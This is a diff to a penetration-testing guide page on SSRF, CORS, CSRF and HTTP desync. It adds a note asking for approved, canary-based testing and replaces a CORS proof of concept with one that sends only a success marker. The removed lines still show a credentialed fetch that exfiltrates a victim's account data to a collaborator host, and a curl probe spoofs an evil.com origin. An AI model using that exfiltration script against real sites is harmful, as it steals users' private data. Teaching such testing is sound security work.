@@ -11,6 +11,9 @@ tags:
 
 # SSRF, CORS, CSRF & HTTP Desync
 
+!!! note "What this page is doing"
+    These issues cross boundaries between a server, a browser and a proxy. Establish a baseline, use a controlled callback or canary, and treat metadata access, request desynchronization and state-changing CSRF as separately approved tests.
+
 ---
 
 ## 1. Server-Side Request Forgery (SSRF)
@@ -85,12 +88,14 @@ curl -s -I https://<DOMAIN>/api/v1/me -H "Origin: https://evil.com" | grep -i "a
 # Access-Control-Allow-Credentials: true
 ```
 
-```javascript
-// PoC that exfiltrates victim's private data cross-origin
+```html
+<!-- Lab PoC: request only the approved test account and send a marker, not data. -->
 <script>
-  fetch('https://<DOMAIN>/api/v1/me', {credentials: 'include'})
-    .then(r => r.text())
-    .then(d => fetch('https://<COLLABORATOR_DOMAIN>/cors?data=' + encodeURIComponent(d)));
+  fetch('https://<DOMAIN>/api/v1/me', { credentials: 'include' })
+    .then((response) => response.ok)
+    .then((ok) => fetch(
+      'https://<COLLABORATOR_DOMAIN>/cors?marker=' + encodeURIComponent(ok)
+    ));
 </script>
 ```
 
